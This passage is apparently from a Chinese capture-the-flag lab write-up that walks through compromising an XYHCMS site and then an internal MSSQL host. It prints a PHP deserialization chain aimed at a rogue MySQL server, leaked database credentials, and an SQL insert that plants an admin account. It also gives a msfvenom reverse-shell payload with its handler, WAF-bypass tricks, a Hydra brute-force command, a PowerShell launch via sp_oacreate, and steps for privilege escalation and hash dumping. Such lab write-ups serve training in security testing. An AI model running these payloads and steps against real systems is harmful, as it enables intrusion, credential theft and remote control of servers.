6,1),char(126)),1);]=1</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"OIsjH26DAQuNhwuKdMt2VeBS0zNvcmMOS1WgIyeJVJQ.png\" alt=\"image\"></p>\n<p>通过日志查看结果：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//103.121.93.206/App/Runtime/Logs/Api/22_05_15.log</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"Ri8oqXFDAYHqHs45rNG6fdPIecZxDlGBhqCA3yKyUBU.png\" alt=\"image\"></p>\n<p>拿到key为：P4tzizR6d</p>\n<h2 id=\"反序列化漏洞利用\"><a href=\"#反序列化漏洞利用\" class=\"headerlink\" title=\"反序列化漏洞利用\"></a>反序列化漏洞利用</h2><p>注册一个会员：</p>\n<p><img src=\"0434TErovOItsmPmfHF-sxPxo-gWTuZ-6ula6ewoftY.png\" alt=\"image\"></p>\n<p><img src=\"SZBzPWuaEwg2KgMJ2DRfUCzUyQr1Z3D8sSosE8wvIDM.png\" alt=\"image\"></p>\n<p>登录之后抓包</p>\n<p><img src=\"WH2mecVyNJbzzoE1zOjrj2Xnblu3c2MXtYVfZG-CU44.png\" alt=\"image\"></p>\n<p>伪造nickname的值</p>\n<p><img src=\"L0WDvpOOl7LFw0pRaueeO3tCs65IYZOetUXuBXRcsC4.png\" alt=\"image\"></p>\n<p><img src=\"kBKVzbAF5OEJ5xMoXEL8CFV0yQagBi7O-yLLsPPctdE.png\" alt=\"image\"></p>\n<h2 id=\"恶意MySQL服务器读取数据库文件-1\"><a href=\"#恶意MySQL服务器读取数据库文件-1\" class=\"headerlink\" title=\"恶意MySQL服务器读取数据库文件\"></a>恶意MySQL服务器读取数据库文件</h2><p>让系统报错，拿到绝对路径：</p>\n<p><code>http://103.121.93.206/App/Api/Conf/config.php</code></p>\n<p>绝对路径：</p>\n<p> <strong>&#x2F;www&#x2F;wwwroot&#x2F;<a href=\"http://www.xycms.com/App/Api/Conf/config.php\">www.xycms.com/App/Api/Conf/config.php</a></strong></p>\n<p><img src=\"rXer-1yIWs82BGv9DM9qQ9AmKh53WyzgVFAUDiasgm8.png\" alt=\"image\"></p>\n<p>查询知道xyhcms的数据库配置文件默认为：xyh.com\\\\App\\\\Common\\\\Conf\\\\db.php</p>\n<p>结合上面知道的绝对路径进行构造：&#x2F;www&#x2F;wwwroot&#x2F;<a href=\"http://www.xycms.com/App/Common/Conf/db.php\">www.xycms.com/App/Common/Conf/db.php</a></p>\n<p><img src=\"cO6t3NlvIIujDXefEUGaNu8WEcOoi2fulIREdXKlslg.png\" alt=\"image\"></p>\n<p>使用poc生成反序列化payload：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">Think</span>\\<span class=\"title class_\">Db</span>\\<span class=\"title class_\">Driver</span>;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">PDO</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Mysql</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$options</span> = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">        PDO::<span class=\"variable constant_\">MYSQL_ATTR_LOCAL_INFILE</span> =&gt; <span class=\"literal\">true</span></span><br><span class=\"line\">    );</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$config</span> = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">    <span class=\"string\">&quot;dsn&quot;</span>    =&gt; <span class=\"string\">&quot;mysql:host=your-vps;dbname=xyhcms;port=3307&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;username&quot;</span> =&gt; <span class=\"string\">&quot;root&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;password&quot;</span> =&gt; <span class=\"string\">&quot;123456&quot;</span></span><br><span class=\"line\">        );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">Think</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Model</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$options</span>   = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$pk</span>;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$data</span> = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$db</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;db = <span class=\"keyword\">new</span> <span class=\"title class_\">\\Think\\Db\\Driver\\Mysql</span>();</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;options[<span class=\"string\">&#x27;where&#x27;</span>] = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;pk = <span class=\"string\">&#x27;luoke&#x27;</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;data[<span class=\"variable language_\">$this</span>-&gt;pk] = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">        <span class=\"string\">&quot;table&quot;</span> =&gt; <span class=\"string\">&quot;xyh_admin_log&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;where&quot;</span> =&gt; <span class=\"string\">&quot;id=0;&quot;</span></span><br><span class=\"line\">        );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">Think</span>\\<span class=\"title class_\">Session</span>\\<span class=\"title class_\">Driver</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Memcache</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$handle</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;handle = <span class=\"keyword\">new</span> <span class=\"title class_\">\\Think\\Model</span>();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">Think</span>\\<span class=\"title class_\">Image</span>\\<span class=\"title class_\">Driver</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Imagick</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"variable\">$img</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;img = <span class=\"keyword\">new</span> <span class=\"title class_\">\\Think\\Session\\Driver\\Memcache</span>();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">Common</span>\\<span class=\"title class_\">Lib</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SysCrypt</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"variable\">$crypt_key</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$crypt_key</span></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"variable language_\">$this</span> -&gt; crypt_key = <span class=\"variable\">$crypt_key</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">php_encrypt</span>(<span class=\"params\"><span class=\"variable\">$txt</span></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"title function_ invoke__\">srand</span>((<span class=\"keyword\">double</span>)<span class=\"title function_ invoke__\">microtime</span>() * <span class=\"number\">1000000</span>);</span><br><span class=\"line\">\t   <span class=\"variable\">$encrypt_key</span> = <span class=\"title function_ invoke__\">md5</span>(<span class=\"title function_ invoke__\">rand</span>(<span class=\"number\">0</span>,<span class=\"number\">32000</span>));</span><br><span class=\"line\">\t   <span class=\"variable\">$ctr</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t   <span class=\"variable\">$tmp</span> = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"variable\">$i</span> = <span class=\"number\">0</span>;<span class=\"variable\">$i</span>&lt;<span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$txt</span>);<span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">\t <span class=\"variable\">$ctr</span> = <span class=\"variable\">$ctr</span> == <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$encrypt_key</span>) ? <span class=\"number\">0</span> : <span class=\"variable\">$ctr</span>;</span><br><span class=\"line\">\t    <span class=\"variable\">$tmp</span> .= <span class=\"variable\">$encrypt_key</span>[<span class=\"variable\">$ctr</span>].(<span class=\"variable\">$txt</span>[<span class=\"variable\">$i</span>]^<span class=\"variable\">$encrypt_key</span>[<span class=\"variable\">$ctr</span>++]);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"built_in\">self</span>::<span class=\"title function_ invoke__\">__key</span>(<span class=\"variable\">$tmp</span>,<span class=\"variable\">$this</span> -&gt; crypt_key));</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">php_decrypt</span>(<span class=\"params\"><span class=\"variable\">$txt</span></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"variable\">$txt</span> = <span class=\"built_in\">self</span>::<span class=\"title function_ invoke__\">__key</span>(<span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$txt</span>),<span class=\"variable\">$this</span> -&gt; crypt_key);</span><br><span class=\"line\">\t   <span class=\"variable\">$tmp</span> = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"variable\">$i</span> = <span class=\"number\">0</span>;<span class=\"variable\">$i</span> &lt; <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$txt</span>); <span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">\t <span class=\"variable\">$md5</span> = <span class=\"variable\">$txt</span>[<span class=\"variable\">$i</span>];</span><br><span class=\"line\">\t    <span class=\"variable\">$tmp</span> .= <span class=\"variable\">$txt</span>[++<span class=\"variable\">$i</span>] ^ <span class=\"variable\">$md5</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"variable\">$tmp</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__key</span>(<span class=\"params\"><span class=\"variable\">$txt</span>,<span class=\"variable\">$encrypt_key</span></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"variable\">$encrypt_key</span> = <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$encrypt_key</span>);</span><br><span class=\"line\">\t   <span class=\"variable\">$ctr</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t   <span class=\"variable\">$tmp</span> = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"variable\">$i</span> = <span class=\"number\">0</span>; <span class=\"variable\">$i</span> &lt; <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$txt</span>); <span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">\t <span class=\"variable\">$ctr</span> = <span class=\"variable\">$ctr</span> == <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$encrypt_key</span>) ? <span class=\"number\">0</span> : <span class=\"variable\">$ctr</span>;</span><br><span class=\"line\">\t    <span class=\"variable\">$tmp</span> .= <span class=\"variable\">$txt</span>[<span class=\"variable\">$i</span>] ^ <span class=\"variable\">$encrypt_key</span>[<span class=\"variable\">$ctr</span>++];</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"variable\">$tmp</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"variable language_\">$this</span> -&gt; crypt_key = <span class=\"literal\">null</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_cookie</span>(<span class=\"params\"><span class=\"variable\">$name</span>, <span class=\"variable\">$key</span> = <span class=\"string\">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"variable\">$key</span> = <span class=\"string\">&#x27;P4tzizR6d&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"variable\">$key</span> = <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$key</span>);</span><br><span class=\"line\">\t<span class=\"variable\">$sc</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">\\Common\\Lib\\SysCrypt</span>(<span class=\"variable\">$key</span>);</span><br><span class=\"line\">\t<span class=\"variable\">$value</span> = <span class=\"variable\">$sc</span>-&gt;<span class=\"title function_ invoke__\">php_decrypt</span>(<span class=\"variable\">$name</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$value</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">set_cookie</span>(<span class=\"params\"><span class=\"variable\">$args</span>, <span class=\"variable\">$key</span> = <span class=\"string\">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"variable\">$key</span> = <span class=\"string\">&#x27;P4tzizR6d&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"variable\">$value</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$args</span>);</span><br><span class=\"line\">\t<span class=\"variable\">$key</span> = <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$key</span>);</span><br><span class=\"line\">\t<span class=\"variable\">$sc</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">\\Common\\Lib\\SysCrypt</span>(<span class=\"variable\">$key</span>);</span><br><span class=\"line\">\t<span class=\"variable\">$value</span> = <span class=\"variable\">$sc</span>-&gt;<span class=\"title function_ invoke__\">php_encrypt</span>(<span class=\"variable\">$value</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"variable\">$value</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$b</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">\\Think\\Image\\Driver\\Imagick</span>();</span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"title function_ invoke__\">set_cookie</span>(<span class=\"variable\">$b</span>,<span class=\"string\">&#x27;&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&#x27;+&#x27;</span>,<span class=\"string\">&#x27;%2B&#x27;</span>,<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"B8FVni6cWgnLewRSeUdYCcaM_aEAVqOR6re3Waas-YA.png\" alt=\"image\"></p>\n<p>VPS进行监听：</p>\n<p>python rogue_mysql_server.py</p>\n<p><img src=\"oSHhuBG6-zHtCordotB0b1TjS2DjWeQlg4UUUJ27DHg.png\" alt=\"image\"></p>\n<p>发送构造好的payload</p>\n<p><img src=\"XtARS5xrVg26S3AGPxkrRsQ6zsN6pNka9bTyMlqgG4c.png\" alt=\"image\"></p>\n<p>VPS上查看日志：</p>\n<p><img src=\"mv7ty5hN_84pMahlQnrviDZkhn4kupl1XzodsaB_Oj8.png\" alt=\"image\"></p>\n<p>拿到数据库的配置文件：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;\\x02&lt;?php return array (\\n  &#x27;DB_TYPE&#x27; =&gt; &#x27;mysqli&#x27;,\\n  &#x27;DB_HOST&#x27; =&gt; &#x27;127.0.0.1&#x27;,\\n  &#x27;DB_PORT&#x27; =&gt; &#x27;3306&#x27;,\\n  &#x27;DB_USER&#x27; =&gt; &#x27;root&#x27;,\\n  &#x27;DB_PWD&#x27; =&gt; &#x27;9a973fd7928bb3c2&#x27;,\\n  &#x27;DB_NAME&#x27; =&gt; &#x27;www_xycms_com&#x27;,\\n  &#x27;DB_PREFIX&#x27; =&gt; &#x27;xyh_&#x27;,\\n  &#x27;DB_CHARSET&#x27; =&gt; &#x27;utf8&#x27;,\\n);?&gt;&quot;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"堆叠插入管理员用户\"><a href=\"#堆叠插入管理员用户\" class=\"headerlink\" title=\"堆叠插入管理员用户\"></a>堆叠插入管理员用户</h2><p>账号：sfmtql</p>\n<p>密码：xxxxxx</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;where&quot;</span> =&gt; <span class=\"string\">&quot;id=0;insert into xyh_admin (id,username,password,encrypt,user_type,is_lock,login_num) VALUES (61,&#x27;sfmtql&#x27;,&#x27;d4404a35b6d63a48d3b15f9bb5ffb6ba&#x27;,&#x27;WDdJDu&#x27;,9,0,4);&quot;</span>\u0000</span><br></pre></td></tr></table></figure>\n<h2 id=\"文件包含getshell\"><a href=\"#文件包含getshell\" class=\"headerlink\" title=\"文件包含getshell\"></a>文件包含getshell</h2><p>添加个html</p>\n<p><img src=\"csmEOScQV0feKNYmSbSAmiStrbzRiFitk8A_ii5xlek.png\" alt=\"image\"></p>\n<p>&#x2F;uploads&#x2F;abc1&#x2F;20220522&#x2F;62891648bfa06.html</p>\n<p><img src=\"hLRd5XlYlxBBYGnE5Lwt-oV5WtKvE1C4YDi5SOh44P0.png\" alt=\"image\"></p>\n<p><img src=\"5IWelP2sVKFetOggLmm85OQvRw5VIUCcNl11T1hJLcU.png\" alt=\"image\"></p>\n<p>至此成功getshell</p>\n<h1 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h1><h3 id=\"蚁剑流量绕过宝塔\"><a href=\"#蚁剑流量绕过宝塔\" class=\"headerlink\" title=\"蚁剑流量绕过宝塔\"></a>蚁剑流量绕过宝塔</h3><p>到这里的时候，使用蚁剑连接一直被办，找到了敏感词为“eval”，后面使用了参数污染添加脏数据，当我发包六万多的时候，成功绕过，最后上传一个base64的马进行连接就不会被拦了。</p>\n<h3 id=\"PHP-FPM绕过disable\"><a href=\"#PHP-FPM绕过disable\" class=\"headerlink\" title=\"PHP-FPM绕过disable\"></a>PHP-FPM绕过disable</h3><p>尝试了很多中绕过之后，发现这种方式可以绕过，一天晚上尝试失败了很多次，莫名其妙发现第二天就好了。</p>\n<p>查看fpm的配置文件（&#x2F;www&#x2F;server&#x2F;php&#x2F;56&#x2F;etc&#x2F;php-fpm.conf）可以拿到php-fpm的位置</p>\n<p><img src=\"3RXKfH7Ggq3M4PMlHI8YpbQc0MupqM5LRt_dO7jpHCg.png\" alt=\"image\"></p>\n<p>成功</p>\n<p><img src=\"fGZDrkPNwgfSmUCpEor1cjmyRN610YH_3ueCUQdWa7o.png\" alt=\"image\"></p>\n<p>创建副本之后成功连接。</p>\n<p><img src=\"-PsNJr9G--N4mA2pZjAIEX4UgOLDJz002glz3KrBdwA.png\" alt=\"image\"></p>\n<p>后来觉得中国蚁剑不好用，就改用哥斯拉了。</p>\n<p><img src=\"LkDh5DVi8J-B3exv3wa6L4Ya8opzJP9rbp8H810GvOA.png\" alt=\"image\"></p>\n<p><img src=\"R2CSEktkUv_Yc5Esl-tC71x3bHM88WtQZDZyRKh_Gzg.png\" alt=\"image\"></p>\n<h3 id=\"msf反弹shell\"><a href=\"#msf反弹shell\" class=\"headerlink\" title=\"msf反弹shell\"></a>msf反弹shell</h3><p>生成攻击载荷</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=vps LPORT=<span class=\"number\">4382</span> -f elf &gt;/root/moonsec/<span class=\"number\">2020</span>/project/zhinan</span><br></pre></td></tr></table></figure>\n<p>开始监听</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">multi</span>/<span class=\"title\">handler</span></span><br><span class=\"line\"><span class=\"title\">set</span> <span class=\"title\">payload</span> <span class=\"title\">linux</span>/<span class=\"title\">x86</span>/<span class=\"title\">meterpreter</span>/<span class=\"title\">reverse_tcp</span></span><br><span class=\"line\"><span class=\"title\">set</span> <span class=\"title\">LHOST</span> 192.168.8.133</span><br><span class=\"line\"><span class=\"title\">set</span> <span class=\"title\">lport</span> 13777</span><br><span class=\"line\"><span class=\"title\">run</span></span><br></pre></td></tr></table></figure>\n<p>开启frp映射本地的13777到vps的4382</p>\n<p>将文件上传到添加执行权限，使用哥斯拉执行即可获取到一个session</p>\n<h3 id=\"提权为root\"><a href=\"#提权为root\" class=\"headerlink\" title=\"提权为root\"></a>提权为root</h3><p>通过上传脚本linux-exploit-suggeter.sh执行之后，能查到该服务器的一些基本信息和一些提权的CVE</p>\n<p><img src=\"7iOKc_4gkq980n4NvudBVS1R4nnJt2fTX2RAXmaggV0.png\" alt=\"image\"></p>\n<p>网上搜索了一下18.04 ubuntu的提权，找到了下面的文章</p>\n<p><a href=\"https://blog.csdn.net/gh0stf1re/article/details/116193906\">https://blog.csdn.net/gh0stf1re/article/details/116193906</a></p>\n<p>然后进行上传exp.c编译之后提权</p>\n<p><code>gcc exp.c -o exp</code></p>\n<p><code>./exp</code></p>\n<p><code>sudo su切换到了root</code></p>\n<p><img src=\"3bKhvlYypWqsdO-qoTJdfnvshGWSXMYH3U5IQli6xKA.png\" alt=\"image\"></p>\n<p><img src=\"STVtcNugZ7eAtYa--jHPilUMxNEB-istIuiZKUKw37A.png\" alt=\"image\"></p>\n<p>在根目录获取到了当前的flag</p>\n<p><img src=\"txCZrvymtSdJNKq0o_i9aBq3Z2TDK0xtfbS57YtC9xU.png\" alt=\"image\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">moonsec_flag&#123;moonsec-<span class=\"number\">30</span>db331044bc750a76da6dbf9e2ae190&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"横向移动\"><a href=\"#横向移动\" class=\"headerlink\" title=\"横向移动\"></a>横向移动</h1><h3 id=\"信息收集-1\"><a href=\"#信息收集-1\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h3><p>cat &#x2F;etc&#x2F;hosts 没发现什么网站</p>\n<p><img src=\"4GZ2YHJxtzYQjitVxWRkxv3c7a32_eDigwzMx2C5SBs.png\" alt=\"image\"></p>\n<p>arp -a 也没发现什么IP</p>\n<p><img src=\"BYCQEOfsdKNaYxc3jrsTq6cvNIxQ97ELS28MWxMU5wI.png\" alt=\"image\"></p>\n<p>metasploit 设置代理进入内网</p>\n<p>run autoroute -s 192.168.52.0&#x2F;24</p>\n<p><img src=\"GeOukDPTulVZ0JpkJan6sQPyrObTEUZ7R1ejZlDY4ms.png\" alt=\"image\"></p>\n<p>启动 socks 模块</p>\n<p>use auxiliary&#x2F;server&#x2F;socks_proxy</p>\n<p>set SRVPORT 22335</p>\n<p>run</p>\n<p><img src=\"D8OlFqtWVDKVzJI1hbIrWNV18lzdA67CpQ0X255JcjU.png\" alt=\"image\"></p>\n<p>发现使用代理扫描太慢了，这就直接在目标安装一个nmap然后进行开扫。</p>\n<p>sudo apt install nmap</p>\n<p><img src=\"OHbsxsWPRDPcX07rVLb8PB5m-TXZhLopv4lKDQIq3PU.png\" alt=\"image\"></p>\n<p>探测到存活的IP：192.168.52.128</p>\n<p><img src=\"I04ti2D6FWvj6EIBgtbY0mhPYwZGOWLptH19lrCbkaY.png\" alt=\"image\"></p>\n<p>扫描端口信息，就只发现了一个1433的mssql端口，没发现web</p>\n<p><img src=\"nu8fs3DYv54nI_vsUquJmZNn56oSd3vhh4LsUxZEOE4.png\" alt=\"image\"></p>\n<p><img src=\"C71x7UxgDlDHLHMyDngbiFLMjQg6zZcANRaFNA7k_4g.png\" alt=\"image\"></p>\n<h3 id=\"hydra爆破sqlserver\"><a href=\"#hydra爆破sqlserver\" class=\"headerlink\" title=\"hydra爆破sqlserver\"></a>hydra爆破sqlserver</h3><p>翻了一圈服务器没找到什么敏感的信息可以利用，只能尝试进行爆破了。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains hydra <span class=\"number\">192.168</span>.<span class=\"number\">52.128</span> mssql -l sa  -P /root/moonsec/<span class=\"number\">2020</span>/project11/top1000-moon.txt -vV -f</span><br></pre></td></tr></table></figure>\n<p>运气还是比较好的，爆破出来了</p>\n<p><img src=\"qwoc2No8vTqDMLfk8BUehvdICGy1T-KPzcLSU7ty8to.png\" alt=\"image\"></p>\n<p>使用msf的模块进行攻击之后，发现有些命令不能执行，就只能执行了whoami，不知道是不是msf6的毛病</p>\n<p><img src=\"Jn00cEcF4rNM6lBIxjDN-JlguNcfIqlCT5OttTjovJM.png\" alt=\"image\"></p>\n<h3 id=\"natvicat客户端连接mssql\"><a href=\"#natvicat客户端连接mssql\" class=\"headerlink\" title=\"natvicat客户端连接mssql\"></a>natvicat客户端连接mssql</h3><p>下载natvicat，然后让其走隧道代理去连接目标</p>\n<p><img src=\"9pd4iJnJ7jMQMKLSXfJwTDgbru8y3LAwn7N9FOZoJzw.png\" alt=\"image\"></p>\n<p>使用xpcmdshell执行以下命令，可以创建文件夹了</p>\n<p><img src=\"UjfVfqimOexOWlSs-WgDwpre8CvnXStf0vcfbt4iWFc.png\" alt=\"image\"></p>\n<p>尝试下载生成的木马，发现没用权限，拒绝访问</p>\n<p><img src=\"nfI_4BLL_UeR0WLSMxO2ZS68zoEsUqPHq02HakyaonU.png\" alt=\"image\"></p>\n<p>尝试powershell上线CS，成功上线</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">declare</span> @shell <span class=\"keyword\">int</span> exec sp_oacreate <span class=\"string\">&#x27;wscript.shell&#x27;</span>,@shell output exec sp_oamethod @shell,<span class=\"string\">&#x27;run&#x27;</span>,<span class=\"literal\">null</span>,<span class=\"string\">&#x27;powershell上线内容&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"Y16Fr2UfEVNPHEDfaIm7wUs1WDHAifxi_17-UgZTuEI.png\" alt=\"image\"></p>\n<p><img src=\"aquBLN7lk1bUHUfvD0VzlDEjQrbtBAUl3bVV2wRFmrg.png\" alt=\"image\"></p>\n<p>派生一个给msf</p>\n<p>use exploit&#x2F;multi&#x2F;handler</p>\n<p>set payload windows&#x2F;meterpreter&#x2F;reverse_http</p>\n<p>set lhost 192.168.8.133</p>\n<p> set lport 13782</p>\n<p><img src=\"aGD3koKShSC4eO9FIGA5eGH7RhaBH1ucK_oBiq4JbbQ.png\" alt=\"image\"></p>\n<p>提权</p>\n<p>当前权限只是数据库权限，需要提权为system，这里使用PrintSpoofer</p>\n<p><img src=\"x0RLhe8FKCkAuqXUHEPkLmZtBIYcxQKSW6QaFQ8M9d4.png\" alt=\"image\"></p>\n<p>然后再上线一个system权限的session</p>\n<p><img src=\"e8VGwT0kwymRqvplCrxidSuN38xz-ftlBGj-uJkxkT8.png\" alt=\"image\"></p>\n<p>导出hash</p>\n<p><img src=\"WrB273TRZOFdjOsTfRZ0llY74lgqf8f3iWCHCRD-W9k.png\" alt=\"image\"></p>\n<p>破解到密码</p>\n<p><img src=\"kEPafJaATAswZpZgVncpDOXKjtqRWGbcfieBHfIxoBQ.png\" alt=\"image\"></p>\n<p>查看flag</p>\n<p>type root.txt</p>\n<p>moonsec_flag{moonsec-557be9af7d66991560155201dc521627}</p>\n<p><img src=\"Q1UlhkwoygUgscOObw4lAlUoo5U2SL1RPTZInYzO6uU.png\" alt=\"image\"></p>\n<h3 id=\"信息收集-2\"><a href=\"#信息收集-2\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h3><p><img 